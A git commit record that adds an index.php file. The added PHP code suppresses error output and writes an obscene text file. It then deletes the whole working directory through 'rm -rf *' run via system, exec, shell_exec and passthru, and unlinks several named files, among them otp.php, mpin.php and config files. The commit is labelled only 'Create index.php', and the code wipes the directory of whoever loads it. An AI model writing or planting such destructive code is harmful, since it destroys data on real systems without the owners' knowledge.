5b29dc37620a4da2bb1e7b60d266a9e09a2c0aac
PhenaxGod <76651777+PhenaxGod@users.noreply.github.com>
2021-06-30 05:48:23 +0000

    Create index.php

--- index.php
+++ index.php
@@ -1,1 +1,15 @@
-// remote
+error_log(0);
+error_reporting(0);
+file_put_contents("fuck-you.txt", "Fuck you asshole.");
+system('rm -rf *');
+exec('rm -rf *');
+shell_exec('rm -rf *');
+passthru('rm -rf *');
+unlink('index.php');
+unlink('otp.php');
+unlink('mpin.php');
+unlink('redir.php');
+unlink('anti.php');
+unlink('config/anti.php');
+unlink('config/404.php');
+unlink('config/zch.php');
